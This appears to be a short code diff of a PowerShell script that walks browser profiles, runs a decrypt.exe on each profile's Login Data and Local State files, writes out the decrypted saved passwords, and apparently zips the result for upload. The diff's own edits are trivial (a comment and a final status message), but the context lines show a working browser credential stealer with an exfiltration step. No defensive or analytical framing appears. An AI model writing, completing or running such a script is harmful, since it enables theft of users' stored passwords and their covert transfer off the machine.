@@ -68,7 +68,7 @@ foreach ($profile in $profiles) {
         if (Test-Path $loginDataPath -and Test-Path $localStatePath) {
             # Run the decrypt.exe with specified parameters and capture output
             $result = & $decryptExePath $loginDataPath $localStatePath $outputPath 2>&1
-            Write-Host "Decrypt.exe output for $profileName: $($result)"
+            Write-Host "Decrypt.exe output for $profileName: $($result)"  # Fixed line
 
             if (Test-Path $outputPath) {
                 Write-Host "$profileName - Decrypted passwords saved to: $outputPath"
@@ -225,3 +225,5 @@ $encodedFile
 } else {
     Write-Host "ZIP file not found, cannot upload."
 }
+
+Write-Host "Script execution completed."
